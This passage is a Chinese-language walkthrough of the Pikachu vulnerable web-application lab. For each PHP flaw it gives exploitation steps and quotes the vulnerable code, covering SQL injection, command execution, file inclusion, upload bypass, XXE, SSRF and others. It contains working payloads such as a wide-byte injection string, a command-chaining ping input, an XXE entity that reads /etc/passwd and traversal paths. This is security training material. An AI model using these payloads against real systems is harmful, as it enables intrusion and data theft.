用 `%df` 消除转义符然后正常注入即可

fuzzing payload `%df' or 1=1#` 通过，存在宽字节注入点，可 SQL 注入一条龙

#### 漏洞代码解读

```PHP
if(isset($_POST['submit']) && $_POST['name']!=null){

    $name = escape($link,$_POST['name']);
    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
    //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题
    $set = "set character_set_client=gbk";
    execute($link,$set);

    //mysqi_query不打印错误描述
    $result=mysqli_query($link, $query);
    if(mysqli_num_rows($result) >= 1){
        while ($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{
        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}
```

## RCE (远程命令/代码执行)

### 概述

RCE ( Remote Command/Code Execute ) 漏洞的出现往往是因为应用系统基于某种业务需要为用户提供了指定的远程命令/代码操作的接口，但没有对用户输入做严格的过滤，导致服务器执行了不该执行的命令而造成不良影响

### exec "ping"

#### 漏洞利用

使用 & 、 && 、 | 等拼接符号即可执行任意命令，例如 `127.0.0.1 & ipconfig`

#### 漏洞代码解读

```PHP
if(isset($_POST['submit']) && $_POST['ipaddress']!=null){
    $ip=$_POST['ipaddress'];
//     $check=explode('.', $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255
    if(stristr(php_uname('s'), 'windows')){
//         var_dump(php_uname('s'));
        $result.=shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理
    }else {
        $result.=shell_exec('ping -c 4 '.$ip);
    }

}
```

### exec "eval"

#### 漏洞利用

高危函数 eval 会将参数当作 PHP 代码执行，该参数字符串必须是合法的 PHP 代码且必须以分号结尾。以经典 fuzzing payload `phpinfo()` 为例，可成功获取服务器敏感信息

#### 漏洞代码解读

```PHP
if(isset($_POST['submit']) && $_POST['txt'] != null){
    if(@!eval($_POST['txt'])){
        $html.="<p>你喜欢的字符还挺奇怪的!</p>";

    }
}
```

## Files Inclusion (文件包含漏洞)

### 概述

文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在 PHP 中，提供了：

- include()
- include_once()
- require()
- require_once()

这些文件包含函数在代码设计中被经常被使用到。

大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击者会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作

### File Inclusion ( local )

#### 漏洞利用

当服务器存在本地文件包含漏洞时，攻击者更倾向于通过包含一些固定的系统配置文件尝试读取系统的敏感信息。除此以外，本地文件包含漏洞常被用以和文件上传漏洞配合，实现等效于远程包含的效果。

这关可配合目录穿越通过 HTTP GET 参数读取服务器上的任何文件。

#### 漏洞代码解读

```PHP
if(isset($_GET['submit']) && $_GET['filename']!=null){
    $filename=$_GET['filename'];
    include "include/$filename";//变量传进来直接包含,没做任何的安全限制
//     //安全的写法,使用白名单，严格指定包含的文件名
//     if($filename=='file1.php' || $filename=='file2.php' || $filename=='file3.php' || $filename=='file4.php' || $filename=='file5.php'){
//         include "include/$filename";

//     }
}
```

### File Inclusion ( remote )

#### 漏洞利用

利用方式与 local 一致

#### 漏洞代码解读

```PHP
if(isset($_GET['submit']) && $_GET['filename']!=null){
    $filename=$_GET['filename'];
    include "$filename";//变量传进来直接包含,没做任何的安全限制
}
```

## Unsafe file downloads (不安全的文件下载)

### 概述

文件下载功能在很多 web 系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件 response 给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。
此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如 ../../../etc/passwd ),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)泄露

### unsafe filedownload

#### 漏洞利用

配合目录穿越通过 HTTP GET 传参即可下载服务器上任意文件

#### 漏洞代码解读

```PHP
// $file_name="cookie.jpg";
$file_path="download/{$_GET['filename']}";
//用以解决中文不能显示出来的问题
$file_path=iconv("utf-8","gb2312",$file_path);

//首先要判断给定的文件存在与否
if(!file_exists($file_path)){
    skip("你要下载的文件不存在，请重新下载", 'unsafe_down.php');
    return ;
}
$fp=fopen($file_path,"rb");
$file_size=filesize($file_path);
//下载文件需要用到的头
ob_clean();//输出前一定要clean一下，否则图片打不开
Header("Content-type: application/octet-stream");
Header("Accept-Ranges: bytes");
Header("Accept-Length:".$file_size);
Header("Content-Disposition: attachment; filename=".basename($file_path));
$buffer=1024;
$file_count=0;
//向浏览器返回数据

//循环读取文件流,然后返回到浏览器feof确认是否到EOF
while(!feof($fp) && $file_count<$file_size){

    $file_con=fread($fp,$buffer);
    $file_count+=$buffer;

    echo $file_con;
}
fclose($fp);
```

## Unsafe file uploads (不安全的文件上传)

### 概述

文件上传功能在 web 应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被攻击者 webshell 控制

### client check

#### 漏洞利用

该页面通过前端代码 ( checkFileExt 函数) 检查上传的文件类型是否为图片。禁用对应 JS 代码忽略或先将文件后缀名改为图片的后缀名再在 MITM 劫持修改上传的文件后缀名即可

#### 漏洞代码解读

```PHP
if(isset($_POST['submit'])){
//     var_dump($_FILES);
    $save_path='uploads';//指定在当前目录建立一个目录
    $upload=upload_client('uploadfile',$save_path);//调用函数
    if($upload['return']){
        $html.="<p class='notice'>文件上传成功</p><p class='notice'>文件保存的路径为：{$upload['new_path']}</p>";
    }else{
        $html.="<p class=notice>{$upload['error']}</p>";
    }
}
```

### MIME type ( server check )

#### 漏洞利用

Web Server 通过 Content-Type HTTP 首部行字段判断接受到的文件类型，故上传时修改该字段值为 image/xx 即可绕过服务端校验

#### 漏洞代码解读

```PHP
if(isset($_POST['submit'])){
//     var_dump($_FILES);
    $mime=array('image/jpg','image/jpeg','image/png');//指定MIME类型,这里只是对MIME类型做了判断。
    $save_path='uploads';//指定在当前目录建立一个目录
    $upload=upload_sick('uploadfile',$mime,$save_path);//调用函数
    if($upload['return']){
        $html.="<p class='notice'>文件上传成功</p><p class='notice'>文件保存的路径为：{$upload['new_path']}</p>";
    }else{
        $html.="<p class=notice>{$upload['error']}</p>";
    }
}
```

### getimagesize

#### 漏洞利用

尽管我没有在这关的源代码里找到 getimagesize 函数，但在绕过该函数的检验时，攻击者需要在文件内容起始处加上 GIF89a 以表明该文件是一个图片。随后正常连接 WebShell 即可

#### 漏洞代码解读

```PHP
if(isset($_POST['submit'])){
    $type=array('jpg','jpeg','png');//指定类型
    $mime=array('image/jpg','image/jpeg','image/png');
    $save_path='uploads'.date('/Y/m/d/');//根据当天日期生成一个文件夹
    $upload=upload('uploadfile','512000',$type,$mime,$save_path);//调用函数
    if($upload['return']){
        $html.="<p class='notice'>文件上传成功</p><p class='notice'>文件保存的路径为：{$upload['save_path']}</p>";
    }else{
        $html.="<p class=notice>{$upload['error']}</p>";

    }
}
```

## Over Permission (越权漏洞)

### 概述

以较小的权限执行了本应无法执行的操作叫做越权操作。存在越权操作漏洞，即越权漏洞的成因是后端没有进行合理的鉴权。越权是最有代表性的逻辑漏洞之一。

### 水平越权

#### 漏洞利用

使用提示中给出的账号登陆，会得到一个查看个人信息的接口，该接口没有进行鉴权，根据 HTTP GET 参数 username 返回用户信息，修改该参数值即可查看其它用户信息甚至脱库

#### 漏洞代码解读

```PHP
if(isset($_GET['submit']) && $_GET['username']!=null){
    //没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定
    $username=escape($link, $_GET['username']);
    $query="select * from member where username='$username'";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)==1){
        $data=mysqli_fetch_assoc($result);
        $uname=$data['username'];
        $sex=$data['sex'];
        $phonenum=$data['phonenum'];
        $add=$data['address'];
        $email=$data['email'];

        $html.=<<<A
<div id="per_info">
   <h1 class="per_title">hello,{$uname},你的具体信息如下：</h1>
   <p class="per_name">姓名:{$uname}</p>
   <p class="per_sex">性别:{$sex}</p>
   <p class="per_phone">手机:{$phonenum}</p>    
   <p class="per_add">住址:{$add}</p> 
   <p class="per_email">邮箱:{$email}</p> 
</div>
A;
    }
}
```

### 垂直越权

#### 漏洞利用

以普通用户的 cookie 可以执行 admin 管理员账户的创建用户操作。

#### 漏洞代码解读

```PHP
//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。
if(!check_op2_login($link)){
    header("location:op2_login.php");
    exit();
}
if(isset($_POST['submit'])){
    if($_POST['username']!=null && $_POST['password']!=null){//用户名密码必填
        $getdata=escape($link, $_POST);//转义
        $query="insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),'{$getdata['sex']}','{$getdata['phonenum']}','{$getdata['email']}','{$getdata['address']}')";
        $result=execute($link, $query);
        if(mysqli_affected_rows($link)==1){//判断是否插入
            header("location:op2_admin.php");
        }else {
            $html.="<p>修改失败,请检查下数据库是不是还是活着的</p>";

        }
    }
}
```

## 目录穿越

### 概述

在 web 功能设计中,很多时候会将用户可能访问的文件路径设置为变量，从而让前端的功能设计更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后端，后端再响应对应的文件。在这个过程中，如果后端没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过 “../” 相对路径访问到违法路径下的文件。

### 目录穿越

#### 漏洞利用

可通过该页面配合 ../ 访问任意文件

#### 漏洞代码解读

```PHP
if(isset($_GET['title'])){
    $filename=$_GET['title'];
    //这里直接把传进来的内容进行了require(),造成问题
    require "soup/$filename";
//    echo $html;
}
```

## 敏感信息泄漏

### 概述

出于开发者的疏忽或者不当的设计，不应该被用户看到的数据可能会被轻易地访问到

- 通过访问url下的目录，可以直接列出目录下的文件列表;
- 输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;
- 前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;

包括但不限于以上情况被称为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往会为攻击者进一步地攻击提供很大的帮助甚至直接造成严重的损失

### find abc

#### 漏洞利用

在前端源代码中可以发现登陆账号与密码

#### 漏洞代码解读

```HTML
测试账号:lili/123456
```

## PHP 反序列化

### 概述

如果反序列化的内容是用户可以控制的,且后台不正确的使用了 PHP 中的魔法函数,就会导致安全问题

### PHP 反序列化

#### 漏洞利用

阅读源代码后可得出 POC

```plaintext
O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
```

#### 漏洞代码解读

```PHP
class S{
    var $test = "pikachu";
    function __construct(){
        echo $this->test;
    }
}

$html='';
if(isset($_POST['o'])){
    $s = $_POST['o'];
    if(!@$unser = unserialize($s)){
        $html.="<p>大兄弟,来点劲爆点儿的!</p>";
    }else{
        $html.="<p>{$unser->test}</p>";
    }
}
```

## XXE

### 概述

XXE , xml external entity injection ， 即 XML 外部实体注入漏洞，其利用原理是攻击者向服务器注入精心构造的恶意 XML 实体内容，从而让服务器按照指定配置进行执行，从而导致问题

### XXE

#### 漏洞利用

阅读源码后得出的 POC 与 payload 如下

```XML
<?xml version = "1.0"?>
<!DOCTYPE note [
    <!ENTITY hacker "7erry">
]>
<name>&hacker;</name>
```

```XML
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "file:///etc/passwd">
]>
<x>&f;</x>
```

#### 漏洞代码解读

```PHP
if(isset($_POST['submit']) and $_POST['xml'] != null){


    $xml =$_POST['xml'];
//    $xml = $test;
    $data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);
    if($data){
        $html.="<pre>{$data}</pre>";
    }else{
        $html.="<p>XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?</p>";
    }
}
```

## URL 重定向

### 概述

不安全的 url 跳转问题可能发生在一切执行了 url 地址跳转的地方。
如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的 url 地址)参数作为了跳转的目的地,而又没有做判断的话
就可能发生"跳错对象"的问题。

url 跳转比较直接的危害是:
-->钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站

### 不安全的 URL 跳转

#### 漏洞利用

页面会跳转到 HTTP GET 请求参数 url 指定的 url 处，填入钓鱼网站 url 即可实现利用

#### 漏洞代码解读

```PHP
if(isset($_GET['url']) && $_GET['url'] != null){
    $url = $_GET['url'];
    if($url == 'i'){
        $html.="<p>好的,希望你能坚持做你自己!</p>";
    }else {
        header("location:{$url}");
    }
}
```

## SSRF

### 概述

SSRF ( Server-Side Request Forgery ) 服务器端请求伪造，即发生在服务器端的 CSRF XD

其形成的原因大都是由于服务端基于某种业务的需要，提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，从而访问到内网的资源或以该 Wedb Server 为跳板对内外网的其它应用进行攻击

### SSRF (curl)

#### 漏洞利用

观察 url 很容易发现目标页面通过 GET 请求的 url 参数对指定 url 的内容进行获取，可通过 http , file , dict ， gopher 等万能协议与 PHP 伪协议访问内外网资源

#### 漏洞代码解读

```PHP
if(isset($_GET['url']) && $_GET['url'] != null){

    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF
    $URL = $_GET['url'];
    $CH = curl_init($URL);
    curl_setopt($CH, CURLOPT_HEADER, FALSE);
    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
    $RES = curl_exec($CH);
    curl_close($CH) ;
//ssrf的问题是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。
//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet
//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP
    echo $RES;
}
```

### SSRF (file_get_content)

#### 漏洞利用

大体上与基于 curl 的 SSRF 漏洞利用一致

#### 漏洞代码解读

```PHP
//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php
//内网请求:http://x.x.x.x/xx.index
if(isset($_GET['file']) && $_GET['file'] !=null){
    $filename = $_GET['file'];
    $str = file_get_contents($filename);
    echo $str;
}
```

## Reference

[Pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)
[使用CSRF盗取SELF-XSS的Cookie](https://www.freebuf.com/column/184589.html)
